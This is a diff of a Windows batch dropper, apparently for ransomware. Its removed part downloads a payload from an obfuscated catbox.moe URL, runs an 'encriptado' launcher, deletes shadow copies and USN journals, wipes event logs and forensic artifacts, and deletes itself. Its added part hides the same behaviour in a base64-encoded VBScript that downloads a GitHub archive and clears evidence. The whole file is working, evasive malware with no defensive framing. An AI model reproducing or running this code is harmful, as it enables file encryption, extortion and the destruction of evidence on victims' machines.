@@ -1,134 +1,30 @@
 @echo off
 setlocal enabledelayedexpansion
 
-REM === EJECUCIÓN 100% INVISIBLE ===
-if not "%1"=="h" (
-    set "vbs=%TEMP%\~%RANDOM%.vbs"
-    echo Set s=CreateObject("WScript.Shell"):s.Run "cmd /c ""%~f0"" h",0,False > "!vbs!"
-    wscript //nologo "!vbs!"
-    del /f /q "!vbs!" >nul 2>&1
-    exit /b
-)
-
-REM === AUTO-REPLICACIÓN AL TEMP ===
-if not "%2"=="w" (
-    set "t=%TEMP%\~w!RANDOM!!RANDOM!.bat"
-    copy /y "%~f0" "!t!" >nul 2>&1
-    if exist "!t!" (
-        start /b cmd /c call "!t!" h w
-        timeout /t 1 /nobreak >nul 2>&1
+if not "%1"=="worker" (
+    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
+    copy /y "%~f0" "!tempbat!" >nul 2>&1
+    if exist "!tempbat!" (
+        start /b cmd /c call "!tempbat!" worker
+        timeout /t 2 /nobreak >nul
         del /f /q "%~f0" >nul 2>&1
     )
     exit /b
 )
 
-REM === CONSTRUCCIÓN DE URL OFUSCADA ===
-set "p1=https://"
-set "p2=files."
-set "p3=catbox"
-set "p4=.moe/"
-set "p5=d6"
-set "p6=ck"
-set "p7=99"
-set "p8=.zip"
-set "url=%p1%%p2%%p3%%p4%%p5%%p6%%p7%%p8%"
+set "vbsfile=%TEMP%\~init!RANDOM!.vbs"
 
-REM === CONFIGURACIÓN ===
-set "zip_file=%TEMP%\~repo%RANDOM%.tmp"
-set "extract_dir=%TEMP%\~sys%RANDOM%"
+powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKCnNjcmlwdFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNjcmlwdE5hbWUgPSBmc28uR2V0RmlsZU5hbWUoc2NyaXB0UGF0aCkKc2NyaXB0RGlyID0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoc2NyaXB0UGF0aCkKdGVtcEJhc2UgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCgpJZiBJblN0cihMQ2FzZShzY3JpcHRQYXRoKSwgTENhc2UodGVtcEJhc2UpKSA+IDAgQW5kIExDYXNlKHNjcmlwdE5hbWUpID0gImNvcmUudmJzIiBUaGVuCiAgICBleGVQYXRoID0gIiIKICAgIEZvciBFYWNoIGYgSW4gZnNvLkdldEZvbGRlcihzY3JpcHREaXIpLkZpbGVzCiAgICAgICAgSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgogICAgICAgICAgICBleGVQYXRoID0gZi5QYXRoCiAgICAgICAgICAgIEV4aXQgRm9yCiAgICAgICAgRW5kIElmCiAgICBOZXh0CiAgICAKICAgIHJlcG9VUkwgPSAiaHR0cHM6Ly9naXRodWIuY29tL2JyYXlhbmpob2FuY2UyLWNvbGxhYi9lbmNyaXB0YWRvL2FyY2hpdmUvcmVmcy9oZWFkcy9tYWluLnppcCIKICAgIHppcFBhdGggPSBzY3JpcHREaXIgJiAiXHJlcG8uemlwIgogICAgZXh0cmFjdFBhdGggPSBzY3JpcHREaXIgJiAiXGV4dHJhY3RlZCIKICAgIAogICAgcHNEb3dubG9hZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwogICAgIltOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTI7ICIgJiBfCiAgICAiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KICAgICJ0cnkgeyAiICYgXwogICAgIiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICciICYgcmVwb1VSTCAmICInIC1PdXRGaWxlICciICYgemlwUGF0aCAmICInIC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwOyAiICYgXwogICAgIiAgICBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAnIiAmIHppcFBhdGggJiAiJyAtRGVzdGluYXRpb25QYXRoICciICYgZXh0cmFjdFBhdGggJiAiJyAtRm9yY2UgIiAmIF8KICAgICJ9IGNhdGNoIHsgZXhpdCAxIH0gIiAmIF8KICAgICIiIiIKICAgIAogICAgc2hlbGwuUnVuIHBzRG93bmxvYWQsIDAsIFRydWUKICAgIFdTY3JpcHQuU2xlZXAgODAwMAogICAgCiAgICBJZiBOb3QgZnNvLkZpbGVFeGlzdHMoemlwUGF0aCkgVGhlbgogICAgICAgIFdTY3JpcHQuUXVpdAogICAgRW5kIElmCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgCiAgICByZXBvUGF0aCA9ICIiCiAgICBsYXVuY2hlclBhdGggPSAiIgogICAgcHl0aG9uUGF0aCA9ICIiCiAgICAKICAgIElmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KICAgICAgICBGb3IgRWFjaCBzdWJmb2xkZXIgSW4gZnNvLkdldEZvbGRlcihleHRyYWN0UGF0aCkuU3ViRm9sZGVycwogICAgICAgICAgICBJZiBMQ2FzZShzdWJmb2xkZXIuTmFtZSkgPSAiZW5jcmlwdGFkby1tYWluIiBUaGVuCiAgICAgICAgICAgICAgICByZXBvUGF0aCA9IHN1YmZvbGRlci5QYXRoCiAgICAgICAgICAgICAgICBsYXVuY2hlclBhdGggPSByZXBvUGF0aCAmICJcbGF1bmNoZXIucHkiCiAgICAgICAgICAgICAgICBweXRob25QYXRoID0gcmVwb1BhdGggJiAiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgogICAgICAgICAgICAgICAgRXhpdCBGb3IKICAgICAgICAgICAgRW5kIElmCiAgICAgICAgTmV4dAogICAgRW5kIElmCiAgICAKICAgIElmIHJlcG9QYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhsYXVuY2hlclBhdGgpIEFuZCBmc28uRmlsZUV4aXN0cyhweXRob25QYXRoKSBUaGVuCiAgICAgICAgc2hlbGwuQ3VycmVudERpcmVjdG9yeSA9IHJlcG9QYXRoCiAgICAgICAgY21kTGF1bmNoID0gIiIiIiAmIHB5dGhvblBhdGggJiAiIiIgIiIiICYgbGF1bmNoZXJQYXRoICYgIiIiIgogICAgICAgIHNoZWxsLlJ1biBjbWRMYXVuY2gsIDAsIEZhbHNlCiAgICAgICAgV1NjcmlwdC5TbGVlcCAxMDAwMAogICAgRW5kIElmCiAgICAKICAgIElmIGV4ZVBhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGV4ZVBhdGgpIFRoZW4KICAgICAgICBGb3IgaSA9IDEgVG8gMwogICAgICAgICAgICBTZXQgZncgPSBmc28uT3BlblRleHRGaWxlKGV4ZVBhdGgsIDIpCiAgICAgICAgICAgIEZvciBqID0gMSBUbyAxMDAwCiAgICAgICAgICAgICAgICBmdy5Xcml0ZUxpbmUgU3RyaW5nKDgwLCBDaHIoSW50KFJuZCAqIDI2KSArIDY1KSkKICAgICAgICAgICAgTmV4dAogICAgICAgICAgICBmdy5DbG9zZQogICAgICAgICAgICBXU2NyaXB0LlNsZWVwIDIwMAogICAgICAgIE5leHQKICAgICAgICBmc28uRGVsZXRlRmlsZSBleGVQYXRoLCBUcnVlCiAgICBFbmQgSWYKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICAKICAgIElmIGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KICAgICAgICB6aXBTaXplID0gZnNvLkdldEZpbGUoemlwUGF0aCkuU2l6ZQogICAgICAgIElmIHppcFNpemUgPiAwIEFuZCB6aXBTaXplIDwgMTAwMDAwMDAwIFRoZW4KICAgICAgICAgICAgRm9yIHBhc3MgPSAxIFRvIDMKICAgICAgICAgICAgICAgIHBzU2hyZWQgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIgJiBfCiAgICAgICAgICAgICAgICAiJGJ5dGVzID0gTmV3LU9iamVjdCBieXRlW10gIiAmIHppcFNpemUgJiAiOyAiICYgXwogICAgICAgICAgICAgICAgIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRieXRlcyk7ICIgJiBfCiAgICAgICAgICAgICAgICAiW0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCciICYgemlwUGF0aCAmICInLCAkYnl0ZXMpICIgJiBfCiAgICAgICAgICAgICAgICAiIiIiCiAgICAgICAgICAgICAgICBzaGVsbC5SdW4gcHNTaHJlZCwgMCwgVHJ1ZQogICAgICAgICAgICAgICAgV1NjcmlwdC5TbGVlcCA1MDAKICAgICAgICAgICAgTmV4dAogICAgICAgIEVuZCBJZgogICAgICAgIGZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKICAgIEVuZCBJZgogICAgCiAgICBzaGVsbC5SZWdEZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVXCIKICAgIAogICAgcHNDbGVhciA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICIiIiAmIF8KICAgICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAiICYgXwogICAgIlJlbW92ZS1JdGVtICdDOlxXaW5kb3dzXFByZWZldGNoXCoucGYnIC1Gb3JjZTsgIiAmIF8KICAgICJDbGVhci1SZWN5Y2xlQmluIC1Gb3JjZSAtQ29uZmlybTokZmFsc2U7ICIgJiBfCiAgICAid2V2dHV0aWwgY2wgQXBwbGljYXRpb24gMj4kbnVsbDsgIiAmIF8KICAgICJ3ZXZ0dXRpbCBjbCBTeXN0ZW0gMj4kbnVsbDsgIiAmIF8KICAgICJSZW1vdmUtSXRlbSAnJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcUFNSZWFkTGluZVxDb25zb2xlSG9zdF9oaXN0b3J5LnR4dCcgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyAiICYgXwogICAgIkdldC1DaGlsZEl0ZW0gJyRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcV2luZG93c1xFeHBsb3JlcicgLUZpbHRlciAnKi5kYicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBSZW1vdmUtSXRlbSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiR2V0LUNoaWxkSXRlbSAnJGVudjpMT0NBTEFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcQXBwQ29tcGF0XFByb2dyYW1zJyAtRmlsdGVyICdBbWNhY2hlKi5oaXZlJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFJlbW92ZS1JdGVtIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgIiAmIF8KICAgICJHZXQtQ2hpbGRJdGVtICckZW52OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xDb3JlQXBwbGljYXRpb25EYXRhJyAtUmVjdXJzZSAtRmlsdGVyICcqLmRiJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFJlbW92ZS1JdGVtIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgIiAmIF8KICAgICJSZW1vdmUtSXRlbSAnJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXE1pY3Jvc29mdFxXaW5kb3dzXEZpbGVIaXN0b3J5JyAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiR2V0LUNoaWxkSXRlbSAnJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50JyAtRmlsdGVyICcqLmxuaycgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBSZW1vdmUtSXRlbSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVJyAtTmFtZSAnKicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQ29tRGxnMzInIC1OYW1lICdPcGVuU2F2ZVBpZGxNUlUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyAiICYgXwogICAgIlJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXENvbURsZzMyJyAtTmFtZSAnTGFzdFZpc2l0ZWRQaWRsTVJVJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAiICYgXwogICAgIiIiIgogICAgc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICBjbGVhbnVwQmF0ID0gc2NyaXB0RGlyICYgIlxjbGVhbnVwLmJhdCIKICAgIFNldCBmYyA9IGZzby5DcmVhdGVUZXh0RmlsZShjbGVhbnVwQmF0LCBUcnVlKQogICAgZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCiAgICBmYy5Xcml0ZUxpbmUgInRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsIgogICAgZmMuV3JpdGVMaW5lICJ0YXNra2lsbCAvZiAvaW0gd3NjcmlwdC5leGUgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICJkZWwgL2YgL3EgIiIiICYgc2NyaXB0UGF0aCAmICIiIiA+bnVsIDI+JjEiCiAgICBmYy5Xcml0ZUxpbmUgImNkIC9kICVURU1QJSIKICAgIGZjLldyaXRlTGluZSAicm1kaXIgL3MgL3EgIiIiICYgc2NyaXB0RGlyICYgIiIiID5udWwgMj4mMSIKICAgIGZjLldyaXRlTGluZSAiKGdvdG8pIDI+bnVsICYgZGVsIC9mIC9xICIiJX4wIiIgJiBleGl0IgogICAgZmMuQ2xvc2UKICAgIAogICAgc2hlbGwuUnVuICJjbWQuZXhlIC9jICIiIiAmIGNsZWFudXBCYXQgJiAiIiIiLCAwLCBGYWxzZQogICAgV1NjcmlwdC5RdWl0CiAgICAKRWxzZQogICAgdGVtcElEID0gInN5c18iICYgSW50KFJuZCAqIDk5OTk5OSArIDEwMDAwMCkKICAgIHRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKICAgIGZzby5DcmVhdGVGb2xkZXIgdGVtcFdvcmsKICAgIAogICAgdmJzVGVtcCA9IHRlbXBXb3JrICYgIlxjb3JlLnZicyIKICAgIGZzby5Db3B5RmlsZSBzY3JpcHRQYXRoLCB2YnNUZW1wLCBUcnVlCiAgICAKICAgIHNoZWxsLlJ1biAid3NjcmlwdC5leGUgIiIiICYgdmJzVGVtcCAmICIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQogICAgV1NjcmlwdC5TbGVlcCAxMDAwCiAgICAKICAgIGZzby5EZWxldGVGaWxlIHNjcmlwdFBhdGgsIFRydWUKICAgIFdTY3JpcHQuUXVpdAogICAgCkVuZCBJZg=='; ^
+$bytes = [Convert]::FromBase64String($b64); ^
+[IO.File]::WriteAllBytes('%vbsfile%', $bytes)"
 
-REM === DESCARGAR CON TRIPLE FALLBACK ===
-powershell -w h -nop -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$ProgressPreference='SilentlyContinue';try{Invoke-WebRequest -Uri '%url%' -OutFile '%zip_file%' -UseBasicParsing -TimeoutSec 120}catch{}" >nul 2>&1
+timeout /t 2 /nobreak >nul
 
-if not exist "%zip_file%" curl -L -s -o "%zip_file%" "%url%" --connect-timeout 60 --max-time 180 >nul 2>&1
-if not exist "%zip_file%" certutil -urlcache -split -f "%url%" "%zip_file%" >nul 2>&1
-
-if not exist "%zip_file%" exit /b 1
-
-REM === VERIFICAR TAMAÑO ===
-for %%F in ("%zip_file%") do set "size=%%~zF"
-if %size% lss 1000000 (
-    del /f /q "%zip_file%" >nul 2>&1
-    exit /b 1
+if exist "%vbsfile%" (
+    start /b wscript.exe "%vbsfile%" //B //Nologo
+    timeout /t 3 /nobreak >nul
 )
 
-REM === EXTRAER ===
-powershell -w h -nop -c "Expand-Archive -Path '%zip_file%' -DestinationPath '%extract_dir%' -Force" >nul 2>&1
-timeout /t 2 /nobreak >nul 2>&1
-
-REM === BUSCAR Y EJECUTAR ===
-set "found=0"
-for /d %%D in ("%extract_dir%\*") do (
-    if exist "%%D\launcher.py" (
-        if exist "%%D\python_portable\python.exe" (
-            cd /d "%%D"
-            start /b "" "%%D\python_portable\python.exe" "%%D\launcher.py"
-            set "found=1"
-            goto cleanup
-        )
-    )
-)
-
-:cleanup
-REM === ESPERAR A QUE LAUNCHER TERMINE (IMPORTANTE) ===
-REM Esperar 60 segundos para instalación de dependencias
-timeout /t 60 /nobreak >nul 2>&1
-
-REM Esperar hasta que launcher.py haya desaparecido (auto-destrucción)
-:wait_loop
-if exist "%extract_dir%\encriptado-main\launcher.py" (
-    timeout /t 10 /nobreak >nul 2>&1
-    goto wait_loop
-)
-
-REM Esperar 30 segundos adicionales para que termine encriptación
-timeout /t 30 /nobreak >nul 2>&1
-
-REM === SECURE DELETE DEL ZIP (3-PASS) ===
-if exist "%zip_file%" (
-    powershell -w h -c "$s=%size%;$b=New-Object byte[] $s;[IO.File]::WriteAllBytes('%zip_file%',$b);$b=New-Object byte[] $s;for($i=0;$i -lt $s;$i++){$b[$i]=0xFF};[IO.File]::WriteAllBytes('%zip_file%',$b);$b=New-Object byte[] $s;(New-Object Random).NextBytes($b);[IO.File]::WriteAllBytes('%zip_file%',$b)" >nul 2>&1
-    del /f /q "%zip_file%" >nul 2>&1
-)
-
-REM === LIMPIAR DNS CACHE ===
-ipconfig /flushdns >nul 2>&1
-
-REM === ELIMINAR VOLUME SHADOW COPIES (VSS) ===
-vssadmin delete shadows /all /quiet >nul 2>&1
-wmic shadowcopy delete /nointeractive >nul 2>&1
-
-REM === ELIMINAR USN JOURNAL ===
-fsutil usn deletejournal /D /N C: >nul 2>&1
-for %%d in (D E F G H) do (
-    if exist %%d:\ fsutil usn deletejournal /D /N %%d: >nul 2>&1
-)
-
-REM === LIMPIEZA ANTI-FORENSE COMPLETA ===
-powershell -w h -nop -c "$e='SilentlyContinue';Remove-Item 'C:\Windows\Prefetch\*.pf' -Force -ea $e;Clear-RecycleBin -Force -Confirm:$false -ea $e;wevtutil cl Application 2>$null;wevtutil cl System 2>$null;wevtutil cl Security 2>$null;Remove-Item '$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -Force -ea $e;Get-ChildItem '$env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer' -Filter '*.db' -ea $e|Remove-Item -Force -ea $e;Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\AppCompat\Programs' -Filter 'Amcache*.hive' -ea $e|Remove-Item -Force -ea $e;Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\CoreApplicationData' -Recurse -Filter '*.db' -ea $e|Remove-Item -Force -ea $e;Remove-Item '$env:USERPROFILE\AppData\Local\Microsoft\Windows\FileHistory' -Recurse -Force -ea $e;Get-ChildItem '$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent' -Filter '*.lnk' -ea $e|Remove-Item -Force -ea $e;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ea $e;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'OpenSavePidlMRU' -ea $e;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'LastVisitedPidlMRU' -ea $e;Stop-Service -Name DiagTrack -Force -ea $e;Remove-Item 'C:\Windows\System32\sru\*.dat' -Force -ea $e;Start-Service -Name DiagTrack -ea $e;Remove-Item 'C:\Windows\appcompat\Programs\*.txt' -Force -ea $e" >nul 2>&1
-
-REM === LIMPIAR SHIMCACHE ===
-reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f >nul 2>&1
-
-REM === LIMPIAR WINDOWS TIMELINE ===
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\TaskFlow" /f >nul 2>&1
-del /f /q "%LOCALAPPDATA%\ConnectedDevicesPlatform\*.db" >nul 2>&1
-del /f /q "%LOCALAPPDATA%\ConnectedDevicesPlatform\*.db-wal" >nul 2>&1
-
-REM === LIMPIAR BAM/DAM (Background Activity Moderator) ===
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" /f >nul 2>&1
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings" /f >nul 2>&1
-
-REM === AUTO-DESTRUCCIÓN DELAYED ===
-set "cleanup=%TEMP%\~c%RANDOM%.bat"
-(
-echo @echo off
-echo timeout /t 10 /nobreak ^>nul 2^>^&1
-echo taskkill /f /im wscript.exe ^>nul 2^>^&1
-echo taskkill /f /im cmd.exe ^>nul 2^>^&1
-echo rmdir /s /q "%extract_dir%" ^>nul 2^>^&1
-echo del /f /q "%~f0" ^>nul 2^>^&1
-echo ^(goto^) 2^>nul ^& del /f /q "%%~f0" ^& exit
-) > "%cleanup%"
-
-start /b cmd /c "%cleanup%"
+del /f /q "%~f0" >nul 2>&1
 exit
